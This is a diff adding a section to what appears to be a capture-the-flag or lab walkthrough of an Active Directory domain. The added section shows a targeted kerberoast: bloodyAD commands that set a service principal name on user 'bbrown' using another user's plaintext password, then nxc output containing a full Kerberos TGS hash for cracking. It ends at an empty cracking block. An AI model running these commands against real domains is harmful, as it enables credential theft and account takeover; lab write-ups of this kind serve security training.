@@ -185,4 +185,28 @@ I can either do a targeted kerberoast or apply shadow credentials
 
 Ill try a targeted kerberoast first 
 
-# Targeted kerberoa
+# Targeted kerberoast leads to user compromise
+
+```python
+bloodyAD --host dc01.shadow.gate -d shadow.gate -u 'jtrueblood' -p 'blood_brothers' set object 'bbrown' servicePrincipalName -v 'service/hacked'
+
+[+] bbrown's servicePrincipalName has been updated
+```
+Ill start by adding the users SPN
+
+```python
+nxc ldap dc01.shadow.gate -u jtrueblood -p 'blood_brothers' --kerberoasting kerb.hash                    
+LDAP        10.1.130.196    389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:shadow.gate) (signing:None) (channel binding:Never) 
+LDAP        10.1.130.196    389    DC01             [+] shadow.gate\jtrueblood:blood_brothers 
+LDAP        10.1.130.196    389    DC01             [*] Skipping disabled account: krbtgt
+LDAP        10.1.130.196    389    DC01             [*] Total of records returned 1
+LDAP        10.1.130.196    389    DC01             [*] sAMAccountName: bbrown, memberOf: CN=ADCS-Reader,CN=Users,DC=shadow,DC=gate, pwdLastSet: 2026-01-15 14:24:07.120150, lastLogon: <never>
+LDAP        10.1.130.196    389    DC01             $krb5tgs$23$*bbrown$SHADOW.GATE$shadow.gate\bbrown*$6bd6a9b56e8040df04bae8c345ade1f9$9a250c9df6f1c6498a7c976bcfb1034d8220fba826f940990179544c8be3905561805b1fab26f437e2b0ed886f40258e93c6abfdacee04f5e2b1c01f2cc41cac662a94d8f9ef02ffdaadabec64c99f1d4c6ae97c12d5ad27fcd72333c14db174a6b8d1ffe9792d7348b7d38f817f5de62f1ce79474dd7f567188807abfddd572597701a9af724dd6a9e3bb318b784cfd5b0158496a5f2c03aa6ddbb4b018f7ce4b7c3dcf512a2628e50d7c1eb291ed3f750a0c82dbebe3e51bf444a9caae336d6b5687048d1d3777e375683b92a7b660fc8ed94afd9b9e2825fc5f1b25fc30d9e8636c2c3624490990218723bbd978cd3e2ed0db83f158d5f89387e0d2cc174fba1370e863b8e88c5df93f78f1c1d8f19cc6dba9e83176280fb8a93554989661a4cdfea5ddbc982a84e19988a38d915773ab6d2c126aa064ae8484e596ef1d1f0c018a93490b93a1bea16029f33099e936e1e6aab01711fe4cc184eefa3866b6033df0cbc42183558ca1d842257f8c9d8e2e2055d0d87984da0500e572a924689f43717446ba98b201f9040ac554283a8301a72533bb02839fb0db15838b9fa3bd93cf0dae5e25dcc37a1b218a92c3ef4f12c0b26acaa02c196d285e0fcd5817b75b7390a728c2024719091ef7c719aa8bda648773f632f8334795aa64abf40440937ea43e33573cd399491c235a556fa8312cabb8be46065f5e411b1d4c785418713ca4ccf2222a9ff51a095a05c3b878ae213870f874e3c20f9ba834eec5cd5b0a0b32165b774ddccd46ceed1290b527c257ddb6007a7650c845188d2e47b6126782580eaecad25a3a2884b5f6824685c7881389b5b303d4fde04e38caf4008f4948f0c0f5c5ebf071cafea675846b41ccf732ddc97287e16b07f7e5a510d8f6d7bd1d5fdd22c7ce97d73aea2edaf9feeb56782e7b170c1d569603d401062c4bce7c2f8037c99c98f80587fdbddd999a8ecb671b27189e65452c1b4f93dc3dec251b69cd196845a9ac28ec89ae3467adc0ceecffc7237fcac9aa7510f903628260041ebd2eff51ed4967287d65be43bee6eb0d6abeaa17984a859514fa49dd98b67355d28eb42183dfb8df11f252a45d931fd192aadc709c596b4f3f662ff28ea93701d0cd2f794ecea3b56efa915dc6e9284628fa06d95e28fbd849d66107fcf1547cb76bdbb7e74f0fd691ea812d0259aefd387a82d570a68380707c84df09813ac25164f7d6f6dfa8474e1c9f112030fcf94b8a25a712758e629dca2b313d7833f7a95bbb76b1078880298d5676167055303e9b28c8851867caa95fb2e28d3ac7fd76bbf2caee46ab5e87859df0e2b93638cc87bc38c45cd68862341334249efbb8a3685b75f80177fc37c591bb286315a493493bb2f3c0814721efde3d7b806fdd8dbe9acae6c571caf3850a0f40cd556d3f701d3c7f2db25477a201155b9eaa7ba8bce9bb8e148d9265d1237b3276710258fefc67fd62ac495c3986e4bbdb3fcbb2ff9ac8deff5cd6d4ae8d7d992310d16163
+```
+Now i have the hash i can try to crack it!
+
+## Cracking the hash
+
+```python
+
+```
